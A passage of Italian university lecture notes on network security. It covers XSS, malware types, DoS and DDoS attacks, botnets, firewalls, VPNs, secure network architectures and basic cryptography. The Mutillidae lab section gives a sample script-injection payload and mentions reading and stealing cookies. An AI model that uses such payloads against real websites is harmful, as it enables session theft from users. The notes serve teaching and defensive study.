`<script>` e rispedisce al client una pagina ottenuta eseguendo l'input
ricevuto (incluso quindi lo script). L'attaccante genera quindi una
pagina con uno script JS malevolo ed invia alla vittima l'URL di questa
pagina.

La vittima apre l'URL ed esegue il codice JS malevolo sulla propria
macchina.

=== XSS stored

L'attaccante scopre un modo per caricare file di scripting (es. PHP) sul
server web e scopre che è possibile far eseguire al server gli script
che l'utente stesso ha caricato. L'attaccante quindi carica uno script
malevolo ed invia l'URL di tale pagina alla vittima.

La vittima esegue la pagina malevola col proprio browser, che in questo
caso può contenere sia codice malevolo per il server, sia codice
malevolo per il client.

La causa principale del XSS stored è la mancata validazione #strong[lato
server] del file caricato dall'utente.

L'XSS stored è molto più pericoloso dell'XSS reflected, perché:

- caricando pagine malevoli, l'attaccante sparge varie "mine" per il
  sito sulle quali potrebbero finire gli utenti;
- un attacco XSS stored non ha bisogno di usare tecniche di social
  engineering per riuscire nello scopo

=== Mutillidae II – OWASP 2017 \> A7 Cross Site Scripting (XSS) \>
Reflected (First Order) \> DNS Lookup

La pagina mostra un form dove l'utente può inserire un hostname o un
indirizzo IP.

Ciò che inserisce l'utente nel form viene stampato nella pagina una
volta eseguito il submit.

Soluzione: inserire `<script>alert("Hello world!")</script>` nel campo
di input.

È possibile sfruttare poi l'XSS per stampare altre cose interessanti
(es. `document.cookie`).

=== Mutillidae II - OWASP 2017 \> A7 Cross Site Scripting (XSS) \>
Persistent (Second Order) \> Add to your blog)

Stessi passi di prima.

Possiamo provare a fare il redirect su un servizio esposto da noi per
effettuare un'operazione di #strong[cookie stealing].

= Lezione 6 - malware, attacchi DoS, botnet

Definizioni:

- #strong[rischio cyber]: probabilità che ha una #strong[minaccia]
  (malware) di sfruttare una #strong[vulnerabilità] (software e/o umana)
  di una #strong[risorsa] per causare danni all'organizzazione;
- #strong[malware]: malicious software. Qualunque programma software
  implementato per scopi malevoli

Nel corso degli anni, si è ridotto il numero di virus con
#strong[intenti distruttivi], ma sono aumentati i #strong[malware
latenti] (ghostware).

Il malware moderno:

- tende a #strong[nascondersi in profondità];
- è difficile da estirpare perché tende a #strong[riprodursi
  autonomamente] in diversi posti e formati

== Obiettivi di un malware

- #strong[installarsi] sui dispositivi nel momento in cui si verifica un
  determinato evento;
- #strong[mascherarsi], infettando il computer sempre più in profondità;
- #strong[replicarsi] all'interno dello stesso dispositivo o da un
  dispositivo all'altro

== Effetti di un malware

Diversi, ed uno non esclude l'altro:

- evidenziarsi in modo manifesto e/o distruttivo (es. ransomware);
- attivarsi in modalità nascosta (es. aprendo una backdoor per poter
  fare ulteriori attacchi);
- informare il creatore/diffusore dell'avvenuta installazione nel
  momento in cui la macchina vittima si connette ad Internet;
- diffondersi autonomamente attraverso cartelle condivise, contatti,
  mailing list, ecc.

== Vettori di infezione

Il 95% dei malware si riceve:

- tramite allegati di email;
- mediante file sharing;
- scaricando programmi infetti

== Tipologie di malware

=== Virus

Programma di #strong[piccole dimensioni] in grado di #strong[replicarsi]
e #strong[diffondersi automaticamente].

=== Trojan

Veicolo usato per diffondere malware. Si tratta di un programma che è
collegato ad un altro file apparentemente innocuo.

L'installazione di un trojan prevede sempre il coinvolgimento
dell'utente, che è convinto mediante tecniche di #strong[social
engineering].

=== Bomba logica

Caratteristica di alcuni malware che si attivano solo dopo un certo
tempo oppure al verificarsi di una certa ricorrenza.

=== Virus polimorfico

Alcuni virus hanno il codice sorgente #strong[cifrato] e lo decifrano
solo in fase di infezione (per poterlo eseguire). Tipicamente la routine
di decifratura è lasciata in chiaro.

Nei virus polimorfici, la routine di decifratura #strong[cambia sempre]
ad ogni nuova infezione, lasciando invariato l'algoritmo. Lo scopo è
quello di non essere rilevati dagli antivirus che riconoscono i malware
tramite la loro #strong[firma].

=== Virus metamorfico

Categoria più sofisticata rispetto ai virus polimorfici. I virus
metamorfici sono in grado di #strong[cambiare completamente] il proprio
codice, sfruttando tecniche avanzate di mascheramento basate su:

- crittografia;
- suddivisione del codice e successivo inserimento in #strong[punti
  diversi] all'interno del file infetto (mentre i virus tradizionali di
  solito includono il loro codice #strong[in fondo] al file e cambiano
  l'#strong[entry point], in modo da eseguire per prima la porzione di
  codice malevolo)

I virus metamorfici sono più difficili da rilevare dagli antivirus,
perché non presentano dei #strong[pattern ricorrenti] nel codice a tempo
d'esecuzione.

=== Virus vs worm

- un virus si #strong[aggancia ad altro software]. Non è possibile
  eseguire il codice del virus separatamente dal programma che è stato
  infettato. I worm invece sono #strong[applicativi a sè stanti];
- tipicamente la diffusione di un virus avviene mediante
  l'#strong[inganno dell'utente]. I worm invece sono in grado di
  replicarsi autonomamente interagendo con la rete e sfruttando le
  vulnerabilità che rilevano

=== Spyware

Malware creato per #strong[spiare] la vittima, tracciandone le attività
ed inviando le informazioni ad un host esterno.

Uno spyware può avere diversi scopi:

- apertamente criminoso (furto di identità/password, ecc.);
- #strong[adware] (raccolta di dati al fine di inviare pubblicità più
  mirate);
- punto d'inizio per ulteriori attacchi: le attività della vittima
  possono dare informazioni utili all'attaccante per fare ulteriori
  attacchi;
- #strong[policeware]: usati dalle forze di polizia per scopi
  investigativi. La maggior parte degli antivirus non li blocca;
- parental control

=== Ransomware

Malware che cifrano i dati presenti su una macchina e #strong[chiedono
un riscatto] (ransom) per riavere indietro i propri dati.

I ransomware sono esplosi nel 2016 (vedi #strong[Wannacry]). Ci sono
stati più di 56.000 attacchi nel solo mese di marzo e si stima che oltre
il 50% delle aziende americane siano state colpite da ransomware.

== Attacchi 0-day

Attacchi che sfruttano vulnerabilità #strong[non ancora note] o che non
sono (ancora) state divulgate pubblicamente.

Si tratta di attacchi #strong[molto costosi], sia per chi li fa sia
(soprattutto) per chi li subisce.

Sfruttare una vulnerabilità non ancora nota pubblicamente permette agli
attaccanti di agire indisturbati rispetto ad antivirus, firewall ed IDS.

Il termine "0-day" deriva dalla #strong[warez scene] degli anni '90, in
cui i cracker riuscivano a rilasciare pubblicamente materiale protetto
da copyright lo stesso giorno (o addirittura prima) del rilascio
ufficiale.

== Advanced Persistent Threat (APT)

Tipologia di attacchi che richiedono un #strong[grande investimento
iniziale]. Per questo motivo vengono fatti solo da professionisti del
cybercrime e hanno come target grandi aziende, in quanto possono
garantire un alto ritorno sull'investimento.

Un attacco APT prevede queste fasi:

+ #strong[ricognizione]: gli attaccanti cercano ed identificano le
  potenziali vittime, tipicamente sfruttando #strong[informazioni
  pubbliche] (es. Google, ecc.), con lo scopo di ottenere dei
  #strong[contatti];
+ #strong[intrusione]: gli attaccanti proseguono con diversi tentativi
  di #strong[spear-phishing] (phishing diretto solo a persone specifiche
  i cui contatti sono stati recuperati precedentemente). Questi attacchi
  hanno lo scopo di infettare le macchine e creare una #strong[backdoor]
  per gli attaccanti;
+ #strong[recupero delle credenziali]: una volta immessi nella rete, gli
  attaccanti cercano di recuperare delle credenziali (tipicamente quelle
  di amministratore) con lo scopo di installare ulteriori backdoor in
  punti diversi;
+ gli attaccanti installano diverse utility nella rete vittima, con lo
  scopo di monitorare le risorse, installare ulteriori backdoor,
  recuperare password, ecc.;
+ #strong[furto dei dati]: gli attaccanti cercano di rubare quanti più
  dati possibile;
+ #strong[mantenimento della persistenza]: qualora si accorgessero di
  essere stati scoperti, gli attaccanti sfruttano diversi metodi per
  assicurarsi di non essere buttati fuori dalla rete

== Denial of service (DoS)

Tipologia di attacco che ha lo scopo di impedire alla vittima di
utilizzare una certa risorsa.

La negazione del servizio può essere causata da:

- #strong[volume] dei dati troppo alto, che causa una saturazione delle
  risorse;
- #strong[contenuto] dei dati, che può essere appositamente progettato
  per sfruttare vulnerabilità

Ogni host connesso in rete è potenzialmente soggetto ad attacchi di tipo
DoS. In molti casi è quasi impossibile evitarli, si possono solo
mitigare i possibili effetti.

Sono attacchi "facili" da fare perché:

- non richiedono di compromettere il sistema attaccato (basta solo
  inviargli un grosso quantitativo di dati);
- non richiedono particolari conoscenze

Un attacco DoS può essere:

- #strong[diretto] se è rivolto alla risorsa da rendere indisponibile;
- #strong[indiretto] se rivolto contro una risorsa differente, ma
  indispensabile per il target effettiivo (es. attaccare il DB di un
  server web anziché il server web stesso)

=== Evoluzione degli attacchi DoS

- seconda metà anni '90: DoS che #strong[sfruttano vulnerabilità] con
  pacchetti volutamente malformati;
- fine anni '90: DoS che mirano ad #strong[esaurire le risorse] della
  vittima;
- dal 1999: attacchi #strong[indiretti], l'attaccante usa altri host in
  rete per raggiungere il suo scopo;
- dal 2000: proliferazione di virus ecc. come base per "conquistare"
  altri host. Inizia l'epoca delle #strong[botnet]

=== Esempi di DoS che sfruttano vulnerabilità

==== Ping of Death (1996)

Attacco DoS che sfrutta un bug nel protocollo IP con il quale si
riescono a mandare pacchetti IP più grandi di 64 KB.

+ l'attaccante crea un pacchetto IP di tipo `echo request` (con
  dimensione maggiore di 64 KB), lo #strong[frammenta] e lo invia alla
  vittima;
+ la vittima inizia ad assemblare i frammenti e va incontro ad un errore
  quando la dimensione del pacchetto riassemblato sfora i 64 KB. La
  conseguenza può essere un crash del server o un hang (il server rimane
  impallato)

Tutti i sistemi operativi dell'epoca erano vulnerabili. Al giorno d'oggi
esistono patch per la risoluzione di queste vulnerabilità già da diverso
tempo.

==== Teardrop

Altro attacco che sfrutta un bug nell'implementazione del protocollo
TCP/IP.

+ l'attaccante invia un pacchetto IP frammentato con alcuni frammenti
  #strong[sovrapposti] ad altri;
+ la vittima, in fase di assemblaggio del pacchetto, va incontro ad un
  errore

Anche questa vulnerabilità è stata patchata da molto tempo.

==== WinNuke (1996)

Altro attacco ai sistemi Windows che prevede l'invio di un pacchetto OOB
(Out of Band) malformato con bit URG \= 1. Causa il fermo del sistema
che riceve questo pacchetto.

Questo attacco sfrutta una vulnerabilità di NetBIOS, il quale non
controlla la correttezza dei pacchetti Out Of Band ricevuti ma li invia
direttamente al kernel.

==== Land

Altro attacco ai sistemi Windows che consiste nell'invare un pacchetto
TCP SYN con la coppia (IP, porta) sorgnete uguale a quella di
destinazione.

Alla ricezione del pacchetto, il sistema vittima cercherà di aprire una
connessione TCP con sè stesso sulla stessa porta d'invio, causando un
loop infinito.

Per rilevare (e prevenire) questi attacchi è sufficiente filtrare i
pacchetti provenienti da Internet che hanno come IP sorgente un IP della
rete interna.

=== DoS per esaurimento delle risorse

Diverse tipologie:

- #strong[resource starvation]: l'attaccante cerca di #strong[saturare]
  una qualche risorsa del sistema (memoria, CPU, ecc.). Se il carico
  generato è sufficientemente alto, il sistema vittima diventa
  inutilizzabile;
- #strong[bandwidth consumption]: l'attaccante cerca di consumare tutta
  la banda della vittima;
- #strong[flooding]: l'attaccante cerca di #strong[inondare di traffico]
  la vittima

==== TCP SYN flood

Attacco con cui l'attaccante invia alla vittima tantissimi pacchetti TCP
SYN in maniera tale da non dargli tempo sufficiente per concludere il
3-way-handshake.

Tipicamente l'attaccante fa uso di tecniche di #strong[IP spoofing] per
non essere rintracciato. A causa di ciò, un access list basata sull'IP
sorgente non è una tecnica efficacie di difesa.

Per mitigare i danni, sulla rete vittima è possibile:

- aumentare la dimensione della coda di connessioni;
- diminuire il timeout per il 3-way-handshake

Per evitare invece che una rete venga usata come sorgente dell'attacco,
è necessario implementare un filtro contro l'IP spoofing (#strong[egress
filtering]).

==== Smurf

Attacco che prevede l'invio di pacchetto ICMP `echo request`
all'#strong[indirizzo broadcast] di una rete.

Tutti gli host della rete riceveranno il pacchetto e risponderanno con
un ICMP `echo reply` all'IP sorgente (che è un IP spoofed), causando un
grande traffico:

- in uscita dalla rete vittima (tutti gli host rispondono all'echo
  request);
- in entrata sulla rete il cui IP è stato "rubato"

Contromisure:

+ per non essere attaccanti, filtrare in uscita dalla propria rete tutti
  i pacchetti ICMP con un indirizzo broadcast come destinazione;
+ per non essere amplificatori, filtrare in ingresso i pacchetti ICMP
  con un indirizzo broadcast come destinazione;
+ per non essere vittime, bloccare in ingresso il traffico ICMP echo
  reply

==== Fraggle

Variante di Smurf che utilizza pacchetti UDP anziché ICMP.

=== Problemi nella difesa da attacchi DoS

Rintracciare gli attaccanti è molto complicato, perché spesso gli
attacchi DoS partono da reti con strutture #strong[multi-livello]
(attaccante -\> master -\> demoni -\> vittima) e si fa ampio uso di
tecniche di #strong[spoofing].

Gli attacchi DoS per esaurimento delle risorse sfruttano pacchetti con
#strong[sintassi lecita], quindi non possono (e non devono) essere
filtrati dal firewall.

Con questi attacchi si possono saturare le risorse di un
#strong[qualunque host] connesso ad Internet: basta avere un numero
sufficiente di demoni per l'attacco.

=== Esempi storici di attacchi DoS

- Yahoo, 1999. 12 ore di inaccessibilità;
- Amazon, 2000. 10 ore di inaccessibilità;
- Estonia, 2007. Più di una settimana di gravi malfunzionamenti

=== Distributed Denial of Service (DDoS)

Attacchi DoS che prevedono 2 livelli di vittime:

- vittime di II livello: sorgenti che vengono utilizzate per la
  generazione del traffico;
- vittime di I livello: coloro ai quali è indirizzato l'attacco DoS

Da vari anni si fa uso di #strong[botnet] per perpetrare questi
attacchi.

Scenario di un attacco DDoS:

+ si individuano dei #strong[computer zombie] sui quali vengono
  installati diversi tool di cracking;
+ utilizzando i tool installati, si cercano altri host da compromettere;
+ si crea una rete per l'attacco, composta da uno o più #strong[master]
  e da molti #strong[demoni];
+ l'attacco DDoS alla vittima inizia quando l'attaccante invia l'ordine
  ai demon tramite il master. Il master deve quindi conoscere
  l'#strong[elenco dei demoni] a cui mandare l'ordine di attacco.

==== Reti DDoS famose

- Tribe Flood Network (TFN), 1999;
- DrDos (Distributed reflected DOS): evoluzione di TFN che sfrutta dei
  #strong[reflection server] (host in rete che offrono almeno un
  servizio TCP), i quali sono delle vittime di II livello. L'attaccante
  invia pacchetti TCP SYN con IP spoofato ai reflection server, i quali
  risponderanno con un SYN/ACK verso la rete della vittima

==== Memcached

Nel 2018 per amplificare gli attacchi DDoS è stato fatto ampio uso di
sistemi #strong[memcached] malconfigurati.

Memcached è un server con funzioni di caching. Sebbene non sia un
servizio pubblico, 17.000 server esponevano pubblicamente servizi
memcached vulnerabili con protocollo UDP abilitato di default.

L'attacco consisteva nell'invio di richieste a questi server memcached
vulnerabili, utilizzando l'indirizzo UDP della vittima come
pseudo-mittente della chiamata. Questo tipo di spoofing causava una
risposta di dimensioni #strong[esponenzialmente maggiori] rispetto alla
richiesta, dunque era molto efficacie.

=== Botnet

Rete di #strong[computer robotizzati] (zombie) che costituisce un vero e
proprio esercito di computer compromessi.

In alcuni casi la botnet può essere creata allo scopo di
#strong[noleggiarla] ad altri cybercriminali.

==== Creazione della botnet

+ ricerca di sistemi che possano essere compromessi, preferendo quelli
  che dispongono di una connessione Internet permanente e con molta
  banda;
+ exploit delle vulnerabilità per ottenere l'accesso agli host;
+ sugli host compromessi (che ormai si possono definire dei
  #strong[bot]) vengono installati dei software per realizzare attacchi
  DDoS;

La botnet viene poi gestita da un centro di #strong[comand e control]
(C&C), realizzato mediante diversi computer distribuiti in comunicazione
tra loro.

==== Scopi di una botnet

- spam;
- DoS;
- scansione e diffusione di malware;
- acquisizione di informazioni

==== Propagazione delle botnet

Le botnet sono prevalentemente "drive-by-download". Sfruttano
vulnerabilità nel browser e/o nei sistemi operativi.

==== Botnet famose

- Storm, 2008. 1,5 milioni di bot;
- #strong[Mirai]: software per la creazione di botnet, ora open source;
- BestBuy;
- vDoS;
- Andromeda

=== Conclusioni

Gli attacchi DoS permettono di esaurire le risorse di un
#strong[qualunque host] connesso ad Internet.

Per l'attacco si utilizzano: - molteplici host zombie (botnet); -
tecniche di IP spoofing; - tecniche di amplificazione del traffico

È difficile rintracciare gli esecutori in quanto l'attacco è condotto
mediante una struttura multilivello: attaccaonte \> master \> demoni \>
vittima.

Soluzioni interne per difendersi da attacchi DoS:

- usare tool per la scansione della rete in grado di rilevare eventuali
  host xombie;
- configurazioni opportune di router e firewall

Soluzioni esterne per difendersi da attacchi DoS:

- utilizzare sistemi anti-DoS messi a disposizione dall'ISP;
- utilizzare delle #strong[CDN] (Content Delivery Network), che offrono
  tantissimi server sparsi in tutto il mondo a cui redirigere il
  traffico. Sono dotate inoltre di molteplici #strong[web application
  firewall] per proteggersi da attacchi a livello applicativo

== Cyber warfare - il caso dell'Estonia

Nel maggio del 2007 l'Estonia è stata sotto pesante attacco informatico
per 3 settimane.

In quel periodo l'Estonia aveva fatto notevoli investimenti per dotare
il paese di una buona infrastruttura digitale, includendo anche
e-government e voto elettronico. Il cedimento di questi servizi poteva
costituire un'enorme problema economico per il paese.

L'Estonia ritiene che questo attacco sia stato portato avanti dalla
Russia e che fosse in qualche modo coinvolto il governo russo. Gli
attacchi subiti dall'Estonia infatti non hanno mai cercato di ottenere
un ritorno economico. La Russia ha sempre smentito queste accuse,
rifiutandosi però di collaborare con il governo estone per la ricerca
dei possibili colpevoli.

A seguito dell'attacco è stato sollevato un caso internazionale che ha
coinvolto anche la NATO. Sebbene un cyberattacco non sia mai stato
considerato come un esplicito atto di guerra contro i membri NATO,
l'evoluzione delle tecnologie potrebbe accelerare il processo di
revisione dei principi alla base dell'alleanza.

I tecnici dell'NCSA, l'unità di crisi NATO per il cyber-terrorismo, non
sono riusciti a dimostrare il coinvolgimento della Russia nell'attacco.

TODO: ritornare un po' di più sulla questione storica, Mirai ecc.

= Lezione 7 - sicurezza reti locali

TODO: questa lezione la riassumo molto poco, perché per il 95% è roba
già vista nel corso di protocolli di rete.

Definizioni:

- paradigma #strong[defence in depth]: introdurre la sicurezza in
  #strong[tutti] i livelli dello stack TCP/IP;
- #strong[segmentazione]: partizionamento delle risorse;
- #strong[segregazione]: controllo degli accessi alle risorse

== VLAN

Tecnica per segmentare la rete in più segmenti logici.

La creazione di una VLAN corrisponde alla creazione di un nuovo dominio
di collisione.

== NAT e PAT

- NAT: modifica del pacchetto in entrata/uscita per applicare regole di
  DNAT/SNAT;
- PAT: modifica del pacchetto in entrata/uscita per cambiare la porta
  sorgente/destinazione

== Firewall

Dispositivo di sicurezza che si interpone tra due reti diverse per
controllare e limitare il traffico.

Concetti da ricordare: - default allow vs default deny; - packet filter
(stateful, stateless e stateful con payload inspection), application
gateway; - l'application gateway può essere trasparente (nessuna
necessità di configurare i client) o essere un proxy firewall (i client
devono essere configurati per passare dal firewall)

== Esercitazioni firewall

=== Esercitazione 1

Per l'FTP, ricordarsi il giro: - il client si connette alla porta 21 del
server; - il server, dalla porta 20, si deve connettere alla porta 21
del client

Sul firewall bisogna quindi abilitare il traffico per entrambe le porte.
Sulla porta 20 bisogna usare `--state ESTABLISHED,RELATED` per il server
ed `ESTABLISHED` per il client.

Per configurare il proxy lato client, impostare la variabile d'ambiente
`HTTP_PROXY=<URL proxy>`.

Per configurare il proxy sul server, aggiungere una riga
`Allow <IP>/<netmask>` nel file `/etc/tinyproxy/tinyproxy.conf` e
riavviare il servizio (`/etc/init.d/tinyproxy restart`).

=== Esercitazione 2

Natting ed FTP: - abilitare il #strong[DNAT] per raggiungere la porta 21
da Internet; - abilitare il #strong[SNAT] per consentire il traffico in
uscita dalla porta 20 di ftp

= Lezione 8 - VPN e architetture sicure

== VPN

Tecnica (hardware e/o software) per realizzare una una rete
#strong[privata individuale] utilizzando apparati di trasmissione
#strong[pubblici condivisi].

=== L2-VPN

VPN di livello 2. Separano il traffico a livello 1 o 2.

Possono essere di due tipi:

- #strong[linee dedicate] (es. #strong[CDN], circuito diretto numerico),
  ovvero dei #strong[collegamenti fisici punto-punto]

#image("assets/fc13bbe6293742f70eb4c3fad3d46689.png")

- #strong[linee a commutazione di circuito]: collegamento diretto
  tramite diversi nodi

#image("assets/cf97e645f0239be8644b7484e17e4c4b.png")

Vantaggi:

- elevata sicurezza, essendo linee dedicate. È molto difficile
  intromettersi in una L2-VPN.

Svantaggi:

- molto costose;
- poco flessibili (si pensi al caso del dipendente che viaggia);
- poco scalabili

Nonostante gli svantaggi, le L2-VPN esistono tuttora nei casi in cui la
rete deve essere assolutamente #strong[trusted].

=== IP-VPN

VPN di livello 3. Separano il traffico a livello 3 o superiore.

Si usa Internet come canale di comunicazione e non una linea dedicata.

Sono più flessibili e meno costose rispetto alle L2-VPN. Garantiscono
però meno sicurezza rispetto alle L2-VPN, in quanto le connessioni sono
#strong[virtuali] e non fisiche.

Le IP-VPN sono delle #strong[overlay network], ovvero si
#strong[sovrappongono] alla rete IP già esistente.

Per garantire riservatezza, integrità ed autenticazione si fa uso di
#strong[incapsulamento] (#strong[tunneling]) e #strong[cifratura].

Il tunneling può essere realizzato:

- sopra al livello 3 (#strong[IPSec]);
- sopra al livello 4 (#strong[SSL])

IPSec è considerata una tecnologia rigida, troppo legata ai sistemi
operativi (essendo implementata a livello 3) e difficile da gestire nel
caso di mobilità tra un dipendente in viaggio e la propria azienda.

SSL è quella che garantisce la migliore flessibilità e semplicità di
realizzazione. In particolare, le SSL-VPN, essendo implementate a
livello 4, sono #strong[indipendenti dal sistema operativo].

Le IP-VPN aggiungono un #strong[overhead] alla comunicazione, perché:

- i pacchetti devono essere cifrati;
- l'incapsulamento dei pacchetti produce pacchetti di dimensione
  maggiore

== Architetture locali sicure

=== Screening router

Border router che ha funzionalità di #strong[packet filtering]
(tipicamente #strong[statico], per mantenere buone prestazioni).

#image("assets/3139f5094a44178c59fb8b62717273e4.png")

=== Dual-homed gateway

Soluzione single-host dove border router e firewall vengono scorporati
su due host distinti (è comunque considerata single-host perché il
border router non viene considerato).

Il dual-homed gateway di solito implementa funzionalità di filtraggio
più avanzate (es. proxy firewall).

L'host che funge da dual-homed gateway ha sempre due schede di rete:

- una per connettersi alla rete interna;
- una per connettersi al border router

Il dual-homed gateway non consente di gestire più sottoreti con
politiche di sicurezza diverse.

#image("assets/9ad1b66eee4d23bc7aa2b9e207f263da.png")

=== Screened-host gateway

2 componenti:

- #strong[screening router]: attua packet filtering. Blocca:
  - in entrata, tutti i pacchetti che non sono diretti al bastion host;
  - in uscita, tutti i pacchetti che non provengono dal bastion host
- #strong[bastion host]: implementa logiche di #strong[proxy firewall]
  (in questo caso si chiama screened-host gateway) e/o un ulteriore
  filtraggio dei pacchetti

Architettura simile al dual-homed gateway, ma in questo caso screening
router e bastion host sono fortemente dipendenti l'uno dall'altro.

Si tratta di un'architettura più costosa e complessa da gestire rispetto
al dual-homed gateway, ma permette una maggiore flessibilità.

#figure(
  image("assets/a7427fd27174d5072dea7c3979e3e7cf.png", height: 30%),
  caption: [Screened-host gateway]
)

=== De-Militarized Zone (DMZ)

Porzione di rete che non fa parte nè della rete esterna nè di quella
interna. Gli host in DMZ sono raggiungibili dall'esterno, ma sono
isolato dalla rete interna.

È un'area tra il border router e il bastion host.

#image("assets/37393db91e8a6538e46b9b9b2a75df4c.png")

=== Two-ledged network

Architettura che introduce la DMZ all'interno della rete.

Nella configurazione single-host garantisce pochissima sicurezza, perché
la DMZ è completamente esposta all'esterno, senza un firewall
intermedio.

#image("assets/0074eed1874778f34f82799242cf8db6.png")

=== Screened subnet

Evoluzione dell'architettura two-ledged network e screened-host gateway.

3 componenti che interagiscono tra loro:

- router esterno: filtra il traffico Internet $arrow.l.r$ DMZ,
  consentendo solamente il transito dei pacchetti da e verso il bastion
  host;
- router interno: protegge sia la rete interna da attacchi provenienti
  da Internet, sia la DMZ da attacchi provenienti dalla rete interna;
- bastion host: si interpone tra i due router e la DMZ e regola il
  traffico che passa tra queste diverse reti

#image("assets/d873ae9b4af0fcf6cc0a40fc638ab5fa.png")

=== Single-host vs dual host

Le architetture single-host sono poco costose e semplici da configurare
e da gestire, ma sono anche dei #strong[single point of failure].

== Segmentazione multipla

La rete interna viene ulteriormente segmentata in diverse sottoreti.
Ognuna di queste sottoreti adotta delle politiche di sicurezza
indipendenti.

Esempio nel contesto di un sito web:

- una rete per gestire la logica di presentazione (es. server HTTP);
- una rete per gestire la logica applicativa (es. application server);
- una rete per gestire i dati (es. DB)

#figure(
  image("assets/1b5a34020ba5e4da8b2ffa94a6484330.png", height: 22%),
  caption: [Segmentazione multipla]
)

= Lezione 9 - introduzione alla crittografia

L'informazione trasmessa su Internet è tipicamente non cifrata e non
autenticata, pertanto #strong[intrinsecamente insicura] per
#strong[scelta progettuale di Internet] stessa (agevolare la
condivisione di informazioni tra centri di ricerca e università). Oggi
però ci sono innumerevoli servizi che si basano su Internet ma che hanno
bisogno di garanzie di riservatezza ed autenticità (es. Internet
banking, ecc.).

Garanzie di sicurezza che si cercano:

- #strong[confidenzialità]: l'informazione dev'essere interpretabile
  solo dall'effettivo destinatario;
- #strong[integrità]: il destinatario deve avere modo di verificare che
  il messaggio non sia stato alterato rispetto a quello inviato dal
  mittente;
- #strong[autenticità]: il destinatario deve avere modo di verificare
  che il messaggio sia stato effettivamente mandato dal mittente e non
  da qualcuno che si spaccia per lui;
- #strong[autorizzazione]: i dati devono essere protetti rispetto ad un
  utilizzo non autorizzato;
- #strong[non repudiabilità]: impossibilità per il mittente di rinnegare
  di aver mandato un messaggio (e per il destinatario di averlo
  ricevuto)

== Crittologia

Scienza delle scritture segrete.

Si divide in 3 argomenti:

- #strong[crittografia]: studia come proteggere i dati
  #strong[manipolando] l'informazione;
- #strong[steganografia]: studia come proteggere i dati
  #strong[nascondendo] l'informazione;
- #strong[crittoanalisi]: studia come #strong[violare] la riservatezza
  de messaggi crittografati o steganografati senza possedere la chiave
  di decifratura

=== Crittografia

Un #strong[crittosistema] è una quitupla
$lr((E comma D comma M comma K comma C))$ dove:

- $M$ è il testo in chiaro (#strong[plaintext]);
- $K$ è l'insieme delle chiavi;
- $C$ è il testo cifrato (#strong[ciphertext]);
- $E$ è una funzione di cofratura tale che $E lr((M comma K)) eq C$;
- $D$ è una funzione di decifratura tale che $D lr((C comma K)) eq M$

==== Sicurezza incondizionata

Uno schema di cifratura si dice #strong[incondizionatamente sicuro] se
il testo cifrato che genera non contiene informazioni sufficienti per
risalire al testo originale, indipendentemente dalla quantità di testo
cifrato a disposizione.

Con l'eccezione dello schema #strong[one-time pad], nessun algoritmo di
cifratura è incondizionatamente sicuro.

Le comunicazioni top-secret (diverse dalle comunicazioni segrete) devono
utilizzare schemi di cifratura incondizionatamente sicuri.

Ogni sistema basato su #strong[ripetizione] è crittoanalizzabile. La
forza del one-time pad sta proprio nel non usare ripetizione.

==== Sicurezza computazionale

Nella pratica, la sicurezza di uno schema si basa su:

- il #strong[costo] per crittoanalizzare il messaggio;
- il #strong[tempo] necessario per crittoanalizzare il messaggio;

Uno schema di cifratura è detto #strong[computazionalmente sicuro] se:

- la crittoanalisi del messaggio costa più rispetto al valore del
  messaggio stesso, oppure
- la crittoanalisi del messaggio richiede più tempo di quello per cui il
  messaggio è utile

==== Crittografia classica e moderna

Storicamente, la crittografia si divide in:

- crittografia classica: fino all'avvento dei computer. Si basava
  sull'utilizzo di tecniche di #strong[sostituzione] (confusione) e/o
  #strong[trasposizione] (diffusione);
- crittografia moderna: si basa su tecniche di sostituzione,
  trasposizione ed eventualmente su #strong[problemi matematici]. Tutti
  gli algoritmi di crittografia moderna sono implementati al computer.

==== Crittografia simmetrica e asimmetrica

Gli algoritmi di cifratura si dividono in: - algoritmi
#strong[simmetrici] (si usa la stessa chiave per cifrare e decifrare); -
algoritmi #strong[asimmetrici] (si usano chiavi diverse per cifrare e
decifrare)

=== Crittoanalisi

Il crittoanalista ha il compito di #strong[violare] i messaggi cifrati,
o almeno scoprire i punti deboli degli algoritmi di cifratura
utilizzati.

Gli attacchi di crittoanalisi si basano su:

- tipologia dell'#strong[algoritmo] usato per la cifratura;
- tipologia della #strong[chiave] usata per la cifratura;
- #strong[natura del testo] (es. lingua, codifica, informazioni
  contenute, ecc.);
- corrispondenza conosciuta tra testo in chiaro e testo cifrato (es.
  conoscenza di alcune parole in determinate posizioni)

==== Attacchi a dizionario per le password

Una password di almeno 8 caratteri garantirebbe un buon livello di
sicurezza rispetto ad attacchi a forza bruta.

Tuttavia non è sufficiente basarsi sulla lunghezza della password per
valutare la sua sicurezza. Un crittoanalista può infatti utilizzare
altre informazioni per ricavare la password, quali:

- conoscenza di dati personali della vittima;
- uso di #strong[dizionari] con parole (o frammenti di parole) di senso
  compiuto

Per poter considerare sicura una password, quindi:

- dev'essere lunga almeno 8 caratteri;
- non deve contenere parole (o frammenti di parole) di senso compiuto in
  nessuna lingua

==== Attacchi a forza bruta

Il crittoanalista prova #strong[tutte le possibili combinazioni di
chiave] finché non riesce ad ottenere un testo in chiaro comprensibile.

In media è sufficiente provare #strong[la metà] delle combinazioni
totali per avere successo.

La sicurezza di uno schema rispetto ad attacchi a forza bruta dipende:

- dal #strong[numero di simboli] usati nella combinazione;
- dal #strong[numero di possibilità] per ogni combinazione;
- dal #strong[tempo] richiesto per provare ogni combinazione

==== Metodi di crittoanalisi moderna

+ crittoanalisi #strong[statica]: sfrutta debolezze nel linguaggio del
  testo originale e del cifrario che mantiene alcune caratteristiche
  statistiche (es. frequenza delle lettere);
+ attacchi a forza bruta: sfrutta la debolezza dovuta al numero limitato
  di combinazioni del cifrario;
+ crittoanalisi matematica: sfrutta debolezze nell'algoritmo matematico
  sottostante ad un cifrario;
+ attacchi al software;
+ social engineering: sfrutta la #strong[debolezza umana]

=== Steganografia

La steganografia non trasforma il contenuto dei messaggi, ma nasconde
l'esistenza stessa del messaggio agli occhi di un osservatore qualsiasi.

Un #strong[acrostico] è un esempio di steganografia.

La steganografia moderna fa ampio uso della #strong[codifica binaria].
Due interlocutori possono utilizzare la steganografia per inviarsi dei
messaggi nascosti all'interno di #strong[file di copertura], tipicamente
in formato multimediale.

Modificando pochi bit del file multimediale infatti è possibile inserire
un messaggio nascosto al suo interno, ma allo stesso tempo non si altera
troppo il contenuto multimediale.

Una delle tecniche impiegate dai programmi di steganografia consiste
proprio nel sostituire i bit meno significativi di un'immagine con i bit
che costituiscono il file/messaggio segreto.

